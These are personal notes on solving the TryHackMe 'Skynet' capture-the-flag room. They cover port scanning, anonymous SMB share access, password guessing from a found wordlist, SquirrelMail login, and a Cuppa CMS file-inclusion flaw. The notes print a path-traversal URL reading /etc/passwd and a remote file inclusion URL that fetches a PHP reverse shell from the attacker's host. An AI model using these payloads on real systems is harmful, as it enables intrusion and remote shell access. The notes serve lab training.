#tryhackme #web #RedTeaming 

NOTE: Accessing the http service did only work when i have burp proxy turned on. 

Lesson to learn:
- Just because you get 1 got idea, do not get stuck on it thinking its the only way to go. 
- In CTFs, we often follow a trail. Its rare that the "find stuff" that has no use. Example when we found the hidden subdirectory, we should investigate this! 


```
# Nmap 7.94SVN scan initiated Sat Feb  1 16:47:37 2025 as: nmap -sC -oN nmap 10.10.176.30
Nmap scan report for 10.10.176.30
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http
|_http-title: Skynet
110/tcp open  pop3
|_pop3-capabilities: UIDL TOP AUTH-RESP-CODE SASL CAPA PIPELINING RESP-CODES
139/tcp open  netbios-ssn
143/tcp open  imap
|_imap-capabilities: capabilities IDLE OK ENABLE SASL-IR IMAP4rev1 have LOGINDISABLEDA0001 post-login ID LITERAL+ listed LOGIN-REFERRALS Pre-login more
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-02-01T15:47:25-06:00
| smb2-time: 
|   date: 2025-02-01T21:47:25
|_  start_date: N/A
|_clock-skew: mean: 1h59m46s, deviation: 3h27m51s, median: -14s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```


- **POP3:** "outdated imap", emails are downloaded to the client then deleted from the server.
- **NETbios-ssn:** "file sharing on a windows network", part of the SMB protocol stack. 
- **IMAP:** "modern POP3", keeps emails on the server and allow for synchronization across multiple devices

Listing smb shares:
```
smbclient -L //10.10.176.30 -N
```

![[Pasted image 20250202132303.png]]

Found a file on anonymous:

```
└─$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

With some logs, log1.txt have lots of what i assume possible passwords:
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

- Tried to brute force creds with this list on the ssh, pop3 and imap. Did not give a result using that password list with the users: 
```
milesdyson
skynet
terminator
Miles Dyson
miles
Miles
```

- There is a http service, we find a subdirectory:
```
/squirrelmail -> Has some login stuff.
Version: 1.4.23

```


Appaired two times in the log:
```
cyborg007haloterminator
```

Check it with the question on the thm page for miles password(kind of cheating, but its ok). And it is correct. Alternatively, we would have to bruteforce the the login on the squirrelmail with the user and password list we have, which would have worked. 

Login into the webinterface of the squirrelmail:
```
milesdyson
cyborg007haloterminator
```

![[Pasted image 20250202135603.png]]

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```


- We where able to login into miles smb share via the "files" application, and writing `smb://<ip>` in the search bar. 


From miles smb share:
```important.txt 
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

We find a new directory, by using gobuster again:
```
http://10.10.187.181/45kra24zxs28v3yd/administrator/
```
- NOTE: Gobuster only go 1 layer by default. 

There is a exploit on this Cuppa CMS admin site:

https://www.exploit-db.com/exploits/25971?ref=blog.tryhackme.com

```
http://10.10.187.181/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

^ allowed us to read files. 


NOTE: we can extract gunzip files like this:
```
gunzip filename.gz
```


Transfere a file via this vulnerability:
```
http://10.10.187.181/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.123.128:8000/php-reverse-shell.php?
```

- Note we need the `?` at the end to execute the file on the server.
- Also, we need to setup both a python http server where we get the shellcode from and a nc listener for when the reverse shell is to be executed. 


![[Pasted image 20250202190618.png]]

Appairently there is a way to exploit the backup.sh which runs once per min: https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com

